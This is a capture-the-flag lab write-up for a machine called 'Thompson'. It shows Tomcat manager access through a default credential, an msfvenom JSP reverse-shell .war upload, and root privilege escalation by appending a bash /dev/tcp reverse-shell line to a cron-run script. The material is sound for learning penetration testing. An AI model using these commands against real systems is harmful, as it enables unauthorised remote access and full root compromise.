---
title: "Thompson"
description: "Enum Port 8080 - Apache Tomcat Portal Dirsearch After doing some enumeration we found some page, when I tried to open page /host-manager/ I got prompt password like this I’ve"
lang: "en"
translationKey: "thompson"
category: "lab-writeups"
tags: ["Lab", "apache tomcat portal", "revshell via .war", "default credential apache tomcat", "Cronjobs", "Linux", "Easy"]
publishDate: "2025-07-28"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "23e5fca1-ed80-8029-8b41-f719cdf3797a"
notionUrl: "https://app.notion.com/p/Thompson-23e5fca1ed8080298b41f719cdf3797a"
notionLastEdited: "2025-07-30T02:45:00.000Z"
---

# Enum

![](/images/thompson/d58127076084.png)

## Port 8080 - Apache Tomcat Portal

![](/images/thompson/09ebda395c2a.png)

**Dirsearch**

![](/images/thompson/59ce24b71614.png)

After doing some enumeration we found some page, when I tried to open page /host-manager/ I got prompt password like this

![](/images/thompson/fd51fc28e49e.png)

I’ve tried input common credentials like admin:admin but it doesn’t give me any succesfull result, so I clicked cancel button and suddenly we got a cred from the response. weird

![](/images/thompson/f8d69708c675.png)

then we used the cred tomcat:s3cret for login via prompt login before. yes we succeed to login 

![](/images/thompson/09b10317028a.png)

after login we found that we are able to upload .war file, so let’s we make revshell using msfvenom in .war format and upload it into server

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.122 LPORT=443 -f war -o revshell.war
```

![](/images/thompson/7f831755bb5c.png)

Upload our shell into server 

![](/images/thompson/9dd100208d97.png)

double click into our revshell in order to get revshell back on our local machine (nc listening)

![](/images/thompson/79616b877d88.png)

Voila we got user flag :

![](/images/thompson/8c08e0e3528a.png)

# Privesc

after getting revshell we found in jack directory there is bash file and txt which contains like this `id.sh` & `id.txt`

```shell
#!/bin/bash
id > test.txt
```

```shell
#id.txt
uid=0(root) gid=0(root) groups=0(root)
```

Then we also found that there is a cronjob who run the [`id.sh`](http://id.sh/) as root user

![](/images/thompson/f33ee28be761.png)

so let’s we overwrite the [id.sh](http://id.sh/) file to get revshell, fortunately we have the access for write the file even the file is not ours

![](/images/thompson/cb47b7863959.png)

Overwrite the file and getting revshell

```shell
echo "bash -i >& /dev/tcp/10.17.49.139/4444 0>&1" >> id.sh
```

![](/images/thompson/cfd816d88da2.png)

after waiting a few second we got the revshell as a root user yeay!!!

![](/images/thompson/4ae1080ca235.png)

Referensi:

- [https://github.com/kh4sh3i/Apache-Tomcat-Pentesting](https://github.com/kh4sh3i/Apache-Tomcat-Pentesting)
- [https://the-pentesting-guide.marmeus.com/web/apache-tomcat](https://the-pentesting-guide.marmeus.com/web/apache-tomcat)
- [https://www.hackingarticles.in/tomcat-penetration-testing/](https://www.hackingarticles.in/tomcat-penetration-testing/)
